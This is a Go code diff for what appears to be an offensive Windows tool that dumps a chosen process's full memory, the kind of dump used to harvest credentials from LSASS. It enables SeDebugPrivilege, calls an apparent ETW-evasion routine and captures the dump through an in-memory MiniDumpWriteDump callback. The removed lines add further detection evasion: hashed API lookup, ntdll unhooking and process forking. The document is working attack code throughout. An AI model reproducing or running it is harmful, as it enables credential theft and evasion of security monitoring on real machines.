@@ -2,10 +2,7 @@ package main
 
 import (
 	"bytes"
-	"crypto/sha1"
 	"encoding/binary"
-	"fmt"
-	"github.com/castaneai/hinako"
 	"golang.org/x/sys/windows"
 	"io/ioutil"
 	"log"
@@ -14,155 +11,108 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
-
-	wins "github.com/cloudfoundry/gosigar/sys/windows"
-	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
 )
 
-var (
-	arch          *hinako.ArchAMD64
-	err           error
-	ReMapNtdll, _ = gabh.ReMapNtdll()
+const (
+	ModuleCallback = iota
+	ThreadCallback
+	ThreadExCallback
+	IncludeThreadCallback
+	IncludeModuleCallback
+	MemoryCallback
+	CancelCallback
+	WriteKernelMinidumpCallback
+	KernelMinidumpStatusCallback
+	RemoveMemoryCallback
+	IncludeVmRegionCallback
+	IoStartCallback
+	IoWriteAllCallback
+	IoFinishCallback
+	ReadMemoryFailureCallback
+	SecondaryFlagsCallback
+	IsProcessSnapshotCallback
+	VmStartCallback
+	VmQueryCallback
+	VmPreReadCallback
+	VmPostReadCallback
+
+	S_FALSE                = 1
+	S_OK                   = 0
+	TRUE                   = 1
+	FALSE                  = 0
+	IncrementSize          = 5 * 1024 * 1024
+	MiniDumpWithFullMemory = 0x00000002
 )
 
-func ZwOpenP(ZwOpenProcess uintptr, pid uintptr) (uintptr, uintptr, uintptr, error) {
-	type objectAttrs struct {
-		Length                   uintptr
-		RootDirectory            uintptr
-		ObjectName               uintptr
-		Attributes               uintptr
-		SecurityDescriptor       uintptr
-		SecurityQualityOfService uintptr
-	}
+var bytesRead uint32 = 0
 
-	type clientID struct {
-		UniqueProcess uintptr
-		UniqueThread  uintptr
-	}
-
-	var pHndl uintptr
-	r1, r2, lastErr := syscall.Syscall6(ZwOpenProcess, 4,
-		uintptr(unsafe.Pointer(&pHndl)),
-		windows.PROCESS_CREATE_PROCESS, //0x1fffff,				//ProcessAllAccess = 0x1fffff
-		uintptr(unsafe.Pointer(&objectAttrs{0, 0, 0, 0, 0, 0})),
-		uintptr(unsafe.Pointer(&clientID{uintptr(pid), 0})),
-		0,
-		0,
-	)
-	return pHndl, r1, r2, lastErr
+type WindowsDump struct {
+	data []byte
 }
 
-func enableSeDebugPrivilege() error {
-	self, err := syscall.GetCurrentProcess()
+type outDump struct {
+	outPtr uintptr
+}
+
+func SePrivEnable(s string) error {
+	var tokenHandle windows.Token
+	thsHandle, err := windows.GetCurrentProcess()
 	if err != nil {
 		return err
 	}
-
-	var token syscall.Token
-	err = syscall.OpenProcessToken(self, syscall.TOKEN_QUERY|syscall.TOKEN_ADJUST_PRIVILEGES, &token)
+	windows.OpenProcessToken(
+		//r, a, e := procOpenProcessToken.Call(
+		thsHandle,                       //  HANDLE  ProcessHandle,
+		windows.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
+		&tokenHandle,                    //	PHANDLE TokenHandle
+	)
+	var luid windows.LUID
+	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(s), &luid)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("LookupPrivilegeValueW failed", err)
+		// {{end}}
 		return err
 	}
-
-	if err = wins.EnableTokenPrivileges(token, wins.SeDebugPrivilege); err != nil {
+	privs := windows.Tokenprivileges{}
+	privs.PrivilegeCount = 1
+	privs.Privileges[0].Luid = luid
+	privs.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
+	err = windows.AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("AdjustTokenPrivileges failed", err)
+		// {{end}}
 		return err
 	}
-
 	return nil
 }
 
 func main() {
-
+	ByETW()
 	pid, _ := strconv.Atoi(os.Args[1])
 
-	e := enableSeDebugPrivilege()
-	if e != nil {
-		fmt.Printf("SeDebugPrivilege failed: %v\n", e)
+	if err := SePrivEnable("SeDebugPrivilege"); err != nil {
 		return
 	}
-	ByETW()
 
-	//===============================================
-	//
-	//		Hook API
-	//
-	//===============================================
-
-	NtQuerySystemInformation, _, e := ReMapNtdll.GetFuncUnhook("ff06d2a62a1b4f33ab91d501ad53158cf899f780", str2sha1)
-	if e != nil {
-		panic(e)
-	}
-
-	// API Hooking by hinako
-	//var original *syscall.Proc
-	var hook2 *hinako.Hook
-	hook2, err = hinako.NewHookByName(arch, "ntdll.dll", "NtQuerySystemInformation", func(n1, n2, n3, n4 uintptr) uintptr {
-		fmt.Println("---------------------------------------------------")
-		fmt.Println("NtQuerySystemInformation hooked !!!!!")
-
-		windows.SleepEx(1, false)
-
-		r, _, _ := syscall.Syscall6(uintptr(NtQuerySystemInformation), 4, n1, n2, n3, n4, 0, 0)
-		//r, _, _ := syscall.Syscall6(original.Addr(), 5, n1,n2,n3,n4,n5,0)
-
-		fmt.Println("---------------------------------------------------")
-		fmt.Println("")
-
-		return uintptr(r)
-	})
+	hProc, err := windows.OpenProcess(0x0040, false, uint32(pid))
+	currentProcHandle, err := windows.GetCurrentProcess()
 	if err != nil {
-		log.Fatalf("failed to hook NtQuerySystemInformation: %+v", err)
+		return
 	}
-	defer hook2.Close()
-	//original = hook1.OriginalProc
-	// After hook
-
-	//===============================================
-	//
-	//		Hook End
-	//
-	//===============================================
-
-	//Read and Fork
-
-	var hProcess uintptr
-	ZwOpenProcess, _, e := ReMapNtdll.GetFuncUnhook("4722e0577c85ecb9c134ffbb2ce080fee0ba5d64", str2sha1)
-	if e != nil {
-		panic(e)
+	var lpTargetHandle windows.Handle
+	err = windows.DuplicateHandle(hProc, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, 0x00000002)
+	if err != nil {
+		return
 	}
 
-	ZwClose, _, e := ReMapNtdll.GetFuncUnhook("27dffd1dd7df9bcfcdcf0513700515a7f6eeb766", str2sha1)
-	if e != nil {
-		panic(e)
-	}
-
-	hProcess, _, _, _ = ZwOpenP(uintptr(ZwOpenProcess), uintptr(pid))
-
-	NtCreateProcessEx, _, e := ReMapNtdll.GetFuncUnhook("df1a83db80c83f59a3b2c0337d704fe579401473", str2sha1)
-	if e != nil {
-		panic(e)
-	}
-
-	var currentSnapshotProcess uintptr
-
-	//syscall.Syscall9(uintptr(NtCreateProcessEx),9,uintptr(unsafe.Pointer(&currentSnapshotProcess)),0x1fffff,0,hProcess,0,0,0,0,0)
-	syscall.Syscall9(uintptr(NtCreateProcessEx), 9, uintptr(unsafe.Pointer(&currentSnapshotProcess)), windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, 0, hProcess, 0, 0, 0, 0, 0)
-
-	//Read and Fork End
-
-	dump, _ := minidump(uint32(pid), windows.Handle(currentSnapshotProcess))
+	dump, _ := minidump(uint32(pid), windows.Handle(lpTargetHandle))
 
 	if dump != nil {
 		ioutil.WriteFile(strconv.Itoa(int(time.Now().UnixMilli()))+".dmp", dump, 0644)
 	}
 
-	syscall.Syscall(uintptr(ZwClose), 1, currentSnapshotProcess, 0, 0)
-	syscall.Syscall(uintptr(ZwClose), 1, hProcess, 0, 0)
-
-}
-
-type outDump struct {
-	outPtr uintptr
 }
 
 type ProcessMemoryCounters struct {
@@ -178,36 +128,147 @@ type ProcessMemoryCounters struct {
 	PeakPagefileUsage          int
 }
 
-type MiniDumpCallbackInformation struct {
-	CallbackRoutine uintptr
-	CallbackParam   uintptr
+var _ unsafe.Pointer
+
+var (
+	modDbgHelp  = windows.NewLazySystemDLL("DbgHelp.dll")
+	modGdi32    = windows.NewLazySystemDLL("Gdi32.dll")
+	modKernel32 = windows.NewLazySystemDLL("Kernel32.dll")
+	modUser32   = windows.NewLazySystemDLL("User32.dll")
+	modadvapi32 = windows.NewLazySystemDLL("advapi32.dll")
+	modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
+	modntdll    = windows.NewLazySystemDLL("ntdll.dll")
+	modpsapi    = windows.NewLazySystemDLL("psapi.dll")
+
+	procMiniDumpWriteDump                 = modDbgHelp.NewProc("MiniDumpWriteDump")
+	procBitBlt                            = modGdi32.NewProc("BitBlt")
+	procCreateCompatibleBitmap            = modGdi32.NewProc("CreateCompatibleBitmap")
+	procCreateCompatibleDC                = modGdi32.NewProc("CreateCompatibleDC")
+	procDeleteDC                          = modGdi32.NewProc("DeleteDC")
+	procDeleteObject                      = modGdi32.NewProc("DeleteObject")
+	procGetDIBits                         = modGdi32.NewProc("GetDIBits")
+	procSelectObject                      = modGdi32.NewProc("SelectObject")
+	procGlobalAlloc                       = modKernel32.NewProc("GlobalAlloc")
+	procGlobalFree                        = modKernel32.NewProc("GlobalFree")
+	procGlobalLock                        = modKernel32.NewProc("GlobalLock")
+	procGlobalUnlock                      = modKernel32.NewProc("GlobalUnlock")
+	procGetDC                             = modUser32.NewProc("GetDC")
+	procGetDesktopWindow                  = modUser32.NewProc("GetDesktopWindow")
+	procReleaseDC                         = modUser32.NewProc("ReleaseDC")
+	procImpersonateLoggedOnUser           = modadvapi32.NewProc("ImpersonateLoggedOnUser")
+	procLogonUserW                        = modadvapi32.NewProc("LogonUserW")
+	procLookupPrivilegeDisplayNameW       = modadvapi32.NewProc("LookupPrivilegeDisplayNameW")
+	procLookupPrivilegeNameW              = modadvapi32.NewProc("LookupPrivilegeNameW")
+	procCreateProcessW                    = modkernel32.NewProc("CreateProcessW")
+	procCreateRemoteThread                = modkernel32.NewProc("CreateRemoteThread")
+	procCreateThread                      = modkernel32.NewProc("CreateThread")
+	procDeleteProcThreadAttributeList     = modkernel32.NewProc("DeleteProcThreadAttributeList")
+	procGetExitCodeThread                 = modkernel32.NewProc("GetExitCodeThread")
+	procGetProcessHeap                    = modkernel32.NewProc("GetProcessHeap")
+	procHeapAlloc                         = modkernel32.NewProc("HeapAlloc")
+	procHeapFree                          = modkernel32.NewProc("HeapFree")
+	procHeapReAlloc                       = modkernel32.NewProc("HeapReAlloc")
+	procHeapSize                          = modkernel32.NewProc("HeapSize")
+	procInitializeProcThreadAttributeList = modkernel32.NewProc("InitializeProcThreadAttributeList")
+	procModule32FirstW                    = modkernel32.NewProc("Module32FirstW")
+	procPssCaptureSnapshot                = modkernel32.NewProc("PssCaptureSnapshot")
+	procQueueUserAPC                      = modkernel32.NewProc("QueueUserAPC")
+	procUpdateProcThreadAttribute         = modkernel32.NewProc("UpdateProcThreadAttribute")
+	procVirtualAllocEx                    = modkernel32.NewProc("VirtualAllocEx")
+	procVirtualProtectEx                  = modkernel32.NewProc("VirtualProtectEx")
+	procRtlCopyMemory                     = modntdll.NewProc("RtlCopyMemory")
+	procGetProcessMemoryInfo              = modpsapi.NewProc("GetProcessMemoryInfo")
+)
+
+func GetProcessHeap() (procHeap windows.Handle, err error) {
+	r0, _, e1 := syscall.Syscall(procGetProcessHeap.Addr(), 0, 0, 0, 0)
+	procHeap = windows.Handle(r0)
+	if procHeap == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func GetProcessMemoryInfo(process windows.Handle, ppsmemCounters *ProcessMemoryCounters, cb uint32) (err error) {
+	r1, _, e1 := syscall.Syscall(procGetProcessMemoryInfo.Addr(), 3, uintptr(process), uintptr(unsafe.Pointer(ppsmemCounters)), uintptr(cb))
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func HeapAlloc(hHeap windows.Handle, dwFlags uint32, dwBytes uintptr) (lpMem uintptr, err error) {
+	r0, _, e1 := syscall.Syscall(procHeapAlloc.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(dwBytes))
+	lpMem = uintptr(r0)
+	if lpMem == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func MiniDumpWriteDump(hProcess windows.Handle, pid uint32, hFile uintptr, dumpType uint32, exceptionParam uintptr, userStreamParam uintptr, callbackParam uintptr) (err error) {
+	r1, _, e1 := syscall.Syscall9(procMiniDumpWriteDump.Addr(), 7, uintptr(hProcess), uintptr(pid), uintptr(hFile), uintptr(dumpType), uintptr(exceptionParam), uintptr(userStreamParam), uintptr(callbackParam), 0, 0)
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func RtlCopyMemory(dest uintptr, src uintptr, dwSize uint32) {
+	syscall.Syscall(procRtlCopyMemory.Addr(), 3, uintptr(dest), uintptr(src), uintptr(dwSize))
+	return
+}
+
+func HeapFree(hHeap windows.Handle, dwFlags uint32, lpMem uintptr) (err error) {
+	r1, _, e1 := syscall.Syscall(procHeapFree.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem))
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func HeapReAlloc(hHeap windows.Handle, dwFlags uint32, lpMem uintptr, dwBytes uintptr) (lpRes uintptr, err error) {
+	r0, _, e1 := syscall.Syscall6(procHeapReAlloc.Addr(), 4, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem), uintptr(dwBytes), 0, 0)
+	lpRes = uintptr(r0)
+	if lpRes == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func HeapSize(hHeap windows.Handle, dwFlags uint32, lpMem uintptr) (res uint32, err error) {
+	r0, _, e1 := syscall.Syscall(procHeapSize.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem))
+	res = uint32(r0)
+	if res == 0 {
+		err = errnoErr(e1)
+	}
+	return
 }
 
 func minidump(pid uint32, proc windows.Handle) ([]byte, error) {
-	GetProcessHeap := syscall.NewLazyDLL("kernel32.dll").NewProc("GetProcessHeap")
+	dump := &WindowsDump{}
 
-	heapHandle, _, err0 := syscall.Syscall(uintptr(GetProcessHeap.Addr()), 0, 0, 0, 0)
-	if heapHandle == 0 {
-		return nil, err0
+	heapHandle, err := GetProcessHeap()
+	if err != nil {
+		return dump.data, err
 	}
 
 	procMemCounters := ProcessMemoryCounters{}
 	sizeOfMemCounters := uint32(unsafe.Sizeof(procMemCounters))
-
-	GetProcessMemoryInfo, _, _ := gabh.DiskFuncPtr("psapi.dll", "730673ace5e3cc0e4be126de2ec956c68a9d03d4", str2sha1)
-	r, _, _ := syscall.Syscall(uintptr(GetProcessMemoryInfo), 3, uintptr(proc), uintptr(unsafe.Pointer(&procMemCounters)), uintptr(sizeOfMemCounters))
-	if r == 0 {
+	err = GetProcessMemoryInfo(proc, &procMemCounters, sizeOfMemCounters)
+	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("GetProcessMemoryInfo failed: %s\n", err)
 		// {{end}}
-		return nil, err
+		return dump.data, err
 	}
 
 	heapSize := procMemCounters.WorkingSetSize + IncrementSize
 
-	HeapAlloc := syscall.NewLazyDLL("kernel32.dll").NewProc("HeapAlloc")
-
-	dumpBuffer, _, _ := syscall.Syscall(HeapAlloc.Addr(), 3, uintptr(heapHandle), uintptr(0x00000008), uintptr(heapSize))
+	dumpBuffer, err := HeapAlloc(heapHandle, 0x00000008, uintptr(heapSize))
+	if err != nil {
+		return dump.data, err
+	}
 
 	outData := outDump{
 		outPtr: dumpBuffer,
@@ -217,51 +278,36 @@ func minidump(pid uint32, proc windows.Handle) ([]byte, error) {
 		CallbackRoutine: windows.NewCallback(minidumpCallback),
 		CallbackParam:   uintptr(unsafe.Pointer(&outData)),
 	}
-	MiniDumpWriteDump, _, e := gabh.DiskFuncPtr("dbgcore.dll", "6fd11841d7f7c5514490f6079ab1c51c3162c477", str2sha1)
 
-	if e != nil {
-		panic(e)
-	}
-
-	Success, _, err := syscall.Syscall9(uintptr(MiniDumpWriteDump), 7,
-		uintptr(proc),
-		uintptr(pid),
+	err = MiniDumpWriteDump(
+		proc,
+		pid,
 		0,
 		MiniDumpWithFullMemory,
-		0, 0,
+		0,
+		0,
 		uintptr(unsafe.Pointer(&callbackInfo)),
-		0, 0)
+	)
 
-	if Success == 0 {
-		fmt.Println("Failed")
-		return nil, err
+	if err != nil {
+		//{{if .Config.Debug}}
+		log.Println("Minidump syscall failed:", err)
+		//{{end}}
+		return dump.data, err
 	}
-	fmt.Println("Dump Succeed")
-
 	outBuff := make([]byte, bytesRead)
 	outBuffAddr := uintptr(unsafe.Pointer(&outBuff[0]))
+	RtlCopyMemory(outBuffAddr, outData.outPtr, bytesRead)
+	err = HeapFree(heapHandle, 0, outData.outPtr)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("HeapFree failed: \n", err)
+		// {{end}}
+		return dump.data, err
+	}
+	dump.data = outBuff
+	return dump.data, nil
 
-	RtlCopyMemory := syscall.NewLazyDLL("kernel32.dll").NewProc("RtlCopyMemory")
-
-	syscall.Syscall(uintptr(RtlCopyMemory.Addr()), 3, outBuffAddr, outData.outPtr, uintptr(bytesRead))
-
-	HeapFree := syscall.NewLazyDLL("kernel32.dll").NewProc("HeapFree")
-
-	syscall.Syscall(HeapFree.Addr(), 3, heapHandle, 0, outData.outPtr)
-
-	return outBuff, nil
-
-}
-
-type MiniDumpCallbackOutput struct {
-	Status int32
-}
-
-type MiniDumpCallbackInput struct {
-	ProcessId     uint32
-	ProcessHandle uintptr
-	CallbackType  uint32
-	Io            MiniDumpIOCallback
 }
 
 type MiniDumpIOCallback struct {
@@ -271,16 +317,29 @@ type MiniDumpIOCallback struct {
 	BufferBytes uint32
 }
 
+type MiniDumpCallbackInput struct {
+	ProcessId     uint32
+	ProcessHandle uintptr
+	CallbackType  uint32
+	Io            MiniDumpIOCallback
+}
+
+type MiniDumpCallbackOutput struct {
+	Status int32
+}
+
+type MiniDumpCallbackInformation struct {
+	CallbackRoutine uintptr
+	CallbackParam   uintptr
+}
+
 func getCallbackInput(callbackInputPtr uintptr) (*MiniDumpCallbackInput, error) {
 	callbackInput := MiniDumpCallbackInput{}
 	ioCallback := MiniDumpIOCallback{}
 	bufferSize := unsafe.Sizeof(callbackInput)
 	data := make([]byte, bufferSize)
 	dataPtr := uintptr(unsafe.Pointer(&data[0]))
-
-	RtlCopyMemory, _, _ := gabh.MemFuncPtr("kernel32.dll", "638f1a50566e7a2aceaeeebc63980672611c32a0", str2sha1)
-
-	syscall.Syscall(uintptr(RtlCopyMemory), 3, dataPtr, callbackInputPtr, uintptr(bufferSize))
+	RtlCopyMemory(dataPtr, callbackInputPtr, uint32(bufferSize))
 	buffReader := bytes.NewReader(data)
 	err := binary.Read(buffReader, binary.LittleEndian, &callbackInput.ProcessId)
 	if err != nil {
@@ -320,41 +379,6 @@ func getCallbackInput(callbackInputPtr uintptr) (*MiniDumpCallbackInput, error) 
 	return &callbackInput, nil
 }
 
-const (
-	ModuleCallback = iota
-	ThreadCallback
-	ThreadExCallback
-	IncludeThreadCallback
-	IncludeModuleCallback
-	MemoryCallback
-	CancelCallback
-	WriteKernelMinidumpCallback
-	KernelMinidumpStatusCallback
-	RemoveMemoryCallback
-	IncludeVmRegionCallback
-	IoStartCallback
-	IoWriteAllCallback
-	IoFinishCallback
-	ReadMemoryFailureCallback
-	SecondaryFlagsCallback
-	IsProcessSnapshotCallback
-	VmStartCallback
-	VmQueryCallback
-	VmPreReadCallback
-	VmPostReadCallback
-
-	S_FALSE                     = 1
-	S_OK                        = 0
-	TRUE                        = 1
-	FALSE                       = 0
-	IncrementSize               = 5 * 1024 * 1024
-	MiniDumpWithFullMemory      = 0x00000002
-	MiniDumpWithFullMemoryInfo  = 0x00000800
-	MiniDumpWithUnloadedModules = 0x00000020
-)
-
-var bytesRead uint32 = 0
-
 func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackOutput *MiniDumpCallbackOutput) uintptr {
 	callbackInput, err := getCallbackInput(callbackInputPtr)
 	if err != nil {
@@ -369,18 +393,15 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 	case IoWriteAllCallback:
 		callbackOutput.Status = S_OK
 		outData := (*outDump)(unsafe.Pointer(callbackParam))
-		GetProcessHeap := syscall.NewLazyDLL("kernel32.dll").NewProc("GetProcessHeap")
-
-		procHeap, _, err := syscall.Syscall(uintptr(GetProcessHeap.Addr()), 0, 0, 0, 0)
-		if procHeap == 0 {
+		procHeap, err := GetProcessHeap()
+		if err != nil {
+			// {{if .Config.Debug}}
 			log.Printf("minidumpCallback GetProcessHeap failed: %s\n", err.Error())
 			// {{end}}
 			return FALSE
 		}
-		HeapSize := syscall.NewLazyDLL("kernel32.dll").NewProc("HeapSize")
-
-		currentBuffSize, _, err := syscall.Syscall(uintptr(HeapSize.Addr()), 3, procHeap, 0, outData.outPtr)
-		if currentBuffSize == 0 {
+		currentBuffSize, err := HeapSize(procHeap, 0, outData.outPtr)
+		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("minidumpCallback HeapSize failed: %s\n", err.Error())
 			// {{end}}
@@ -394,10 +415,8 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 			} else {
 				increasedSize += int(bytesAndOffset)
 			}
-			HeapReAlloc := syscall.NewLazyDLL("kernel32.dll").NewProc("HeapReAlloc")
-
-			outData.outPtr, _, err = syscall.Syscall6(uintptr(HeapReAlloc.Addr()), 4, procHeap, 0, outData.outPtr, uintptr(increasedSize), 0, 0)
-			if outData.outPtr == 0 {
+			outData.outPtr, err = HeapReAlloc(procHeap, 0, outData.outPtr, uintptr(increasedSize))
+			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("minidumpCallback HeapReAlloc failed: %s\n", err.Error())
 				// {{end}}
@@ -405,11 +424,7 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 			}
 		}
 		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)
-
-		RtlCopyMemory, _, _ := gabh.MemFuncPtr("kernel32.dll", "638f1a50566e7a2aceaeeebc63980672611c32a0", str2sha1)
-
-		syscall.Syscall(uintptr(RtlCopyMemory), 3, destination, callbackInput.Io.Buffer, uintptr(callbackInput.Io.BufferBytes))
-
+		RtlCopyMemory(destination, callbackInput.Io.Buffer, callbackInput.Io.BufferBytes)
 		bytesRead += callbackInput.Io.BufferBytes
 	case IoFinishCallback:
 		callbackOutput.Status = S_OK
@@ -417,11 +432,4 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 		return TRUE
 	}
 	return TRUE
-}
-
-func str2sha1(s string) string {
-	h := sha1.New()
-	h.Write([]byte(s))
-	bs := h.Sum(nil)
-	return fmt.Sprintf("%x", bs)
 }
